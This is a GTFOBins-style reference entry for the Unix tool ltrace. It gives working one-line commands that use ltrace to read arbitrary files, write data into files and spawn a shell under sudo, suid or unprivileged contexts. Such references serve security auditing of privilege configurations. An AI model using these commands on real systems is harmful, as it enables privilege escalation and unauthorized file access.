---
type: gtfobin
name: ltrace
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# ltrace

## file-read

```bash
ltrace -F /path/to/input-file /dev/null
```
_The file is parsed as a configuration file and its content is shown as error messages._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
ltrace -s 999 -o /path/to/input-file ltrace -F DATA
```
_The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`._
**Contexts:** sudo, unprivileged

## shell

```bash
ltrace -b -L /bin/sh
```
**Contexts:** sudo, unprivileged
